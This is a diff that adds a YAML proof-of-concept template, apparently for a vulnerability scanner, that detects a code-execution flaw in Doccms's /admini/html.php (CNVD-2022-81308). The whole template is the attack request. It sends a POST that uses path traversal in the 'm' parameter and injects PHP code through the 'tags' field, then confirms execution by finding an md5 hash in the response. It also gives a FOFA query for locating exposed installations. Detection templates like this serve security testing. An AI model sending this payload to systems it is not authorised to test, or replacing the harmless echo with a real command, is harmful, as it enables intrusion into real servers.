@@ -1,0 +1,20 @@
+id: poc-yaml-doccms-admini-html-rce
+info:
+  name: Doccms /admini/html.php 代码执行漏洞（CNVD-2022-81308）
+  severity: critical
+  tags:
+  - rce
+  - CNVD-2022-81308
+  finger: doccms
+  fofa: app="Doccms"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /admini/html.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: m=/../../../admini/views/system/lang/editTags.php&tags=1);echo md5({{.t1}});//
+  expression: "status_code == 200 && \ncontains(body,t2)\n"
+transport: http
